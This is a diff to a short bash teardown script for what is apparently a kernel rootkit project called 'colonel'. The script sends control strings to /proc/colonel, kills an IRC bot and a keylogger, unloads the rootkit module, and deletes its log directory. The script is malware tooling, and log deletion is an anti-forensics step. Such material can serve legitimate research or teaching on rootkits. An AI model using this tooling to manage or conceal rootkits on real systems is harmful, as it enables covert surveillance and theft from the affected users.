@@ -1,14 +1,19 @@
 #!/bin/bash
 
-cd lkm/
+# kill irc bot
+echo -n sp >> /proc/colonel
+echo -n sp >> /proc/colonel
+sudo pkill -f col_bot
 
 # remove keylogger
-echo -n sp >> /proc/colonel
-echo -n sp >> /proc/colonel
+cd lkm/
 sudo killall col_kl
-rm col_kl
+sudo rm col_kl
 
 # cleanup the rootkit
 echo -n ms >> /proc/colonel
 sudo rmmod rootkit
-make clean
+sudo make clean
+
+# remove logs
+sudo rm -rf /opt/__col_log
